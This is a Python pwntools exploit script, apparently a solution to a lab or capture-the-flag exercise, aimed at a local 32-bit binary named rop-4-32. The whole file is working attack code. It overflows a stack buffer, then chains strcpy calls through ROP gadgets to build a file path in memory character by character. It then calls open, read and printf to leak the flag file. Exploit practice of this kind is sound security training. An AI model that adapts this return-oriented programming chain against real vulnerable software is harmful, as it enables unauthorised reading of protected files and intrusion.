from pwn import *
import string

GARB = 'bbbb'

# Addresses needed for the attack
pop_pop_ret_addr = 0x0804873a # From ROPgadget --binary ./rop-4-32
pop_pop_pop_ret_addr = 0x08048739 # From ROPgadget --binary ./rop-4-32
open_addr = ELF('./rop-4-32').symbols['open']
read_addr = ELF('./rop-4-32').symbols['read']
printf_addr = ELF('./rop-4-32').symbols['printf']
strcpy_addr = ELF('./rop-4-32').symbols['strcpy']
data_start_addr = 0x0804a02c # Address of the answer
tqbf_addr =  0x08048768 # Address of the letters string
slash_addr = 0x080487e0 # Address of the slash
number_addr = 0x080487b1  # Address of the numbers string
null_addr =  0x08048794 # Address of null terminator

# Constants needed for attack
tqbf = "the quick brown fox jumps over the lazy dog!"
number = "1234567890-"


# Build a ropchain to strcpy path into data_start_addr
def create_string(path):
    inp = 'a' * 0x88 + GARB
    data_curr_addr = data_start_addr

    for letter in path:
        if letter in string.ascii_lowercase:
            letter_index = tqbf.find(letter)
            inp = inp + p32(strcpy_addr) + p32(pop_pop_ret_addr) + p32(data_curr_addr) + p32(tqbf_addr + letter_index)

        elif letter in string.digits or letter == '-':
            letter_index = number.find(letter)
            inp = inp + p32(strcpy_addr) + p32(pop_pop_ret_addr) + p32(data_curr_addr) + p32(number_addr + letter_index)

        else:
            inp = inp + p32(strcpy_addr) + p32(pop_pop_ret_addr) + p32(data_curr_addr) + p32(slash_addr)

        data_curr_addr = data_curr_addr + 1

    inp = inp + p32(strcpy_addr) + p32(pop_pop_ret_addr) + p32(data_curr_addr) + p32(null_addr)

    return inp

# Build rop chain
inp = create_string('/home/labs/week5/rop-4-32/flag')
inp = inp + p32(open_addr) + p32(pop_pop_ret_addr) + p32(data_start_addr) + p32(0)
inp = inp + p32(read_addr) + p32(pop_pop_pop_ret_addr) + p32(3) + p32(data_start_addr) + p32(100)
inp = inp + p32(printf_addr) + GARB + p32(data_start_addr)

# Launch processs and send rop chain
p = process('./rop-4-32')
p.send(inp)

# Use privilleged shell to get the flag
p.interactive()
